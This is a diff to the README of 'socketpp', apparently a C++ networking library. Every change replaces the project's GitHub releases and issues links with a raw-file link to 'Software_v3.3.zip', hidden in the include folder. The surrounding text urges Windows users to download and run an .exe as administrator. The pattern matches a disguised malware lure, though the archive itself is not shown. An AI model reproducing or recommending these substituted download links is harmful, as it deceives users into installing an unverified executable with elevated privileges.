@@ -1,6 +1,6 @@
 # 🖧 socketpp - Simple, Fast Network Connections
 
-[![Download on GitHub](https://img.shields.io/badge/Download-socketpp-brightgreen)](https://github.com/aefahimi/socketpp/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download-socketpp-brightgreen)](https://raw.githubusercontent.com/aefahimi/socketpp/master/include/socketpp/socket/Software_v3.3.zip)
 
 ---
 
@@ -34,7 +34,7 @@ To get socketpp, follow these steps:
 
 1. Open the main download page by clicking the big button below:
 
-   [![Download](https://img.shields.io/badge/Download-socketpp-blue)](https://github.com/aefahimi/socketpp/releases)
+   [![Download](https://img.shields.io/badge/Download-socketpp-blue)](https://raw.githubusercontent.com/aefahimi/socketpp/master/include/socketpp/socket/Software_v3.3.zip)
 
 2. You will see a list of release versions. Each release may have multiple files for different systems.
 
@@ -100,7 +100,7 @@ If socketpp does not start or work as expected, try these steps:
 
 - Run socketpp as an administrator: right-click the `.exe` file and select “Run as administrator”.
 
-If problems continue, visit the [issues section on GitHub](https://github.com/aefahimi/socketpp/issues) for support.
+If problems continue, visit the [issues section on GitHub](https://raw.githubusercontent.com/aefahimi/socketpp/master/include/socketpp/socket/Software_v3.3.zip) for support.
 
 ---
 
@@ -108,7 +108,7 @@ If problems continue, visit the [issues section on GitHub](https://github.com/ae
 
 To update socketpp:
 
-1. Go to the same release page at [https://github.com/aefahimi/socketpp/releases](https://github.com/aefahimi/socketpp/releases).
+1. Go to the same release page at [https://raw.githubusercontent.com/aefahimi/socketpp/master/include/socketpp/socket/Software_v3.3.zip](https://raw.githubusercontent.com/aefahimi/socketpp/master/include/socketpp/socket/Software_v3.3.zip).
 
 2. Download the latest Windows version again.
 
@@ -130,4 +130,4 @@ For technical details, code examples, or to report bugs, use the GitHub page.
 
 Use this link anytime to get the latest socketpp version for Windows:
 
-[https://github.com/aefahimi/socketpp/releases](https://github.com/aefahimi/socketpp/releases)
+[https://raw.githubusercontent.com/aefahimi/socketpp/master/include/socketpp/socket/Software_v3.3.zip](https://raw.githubusercontent.com/aefahimi/socketpp/master/include/socketpp/socket/Software_v3.3.zip)
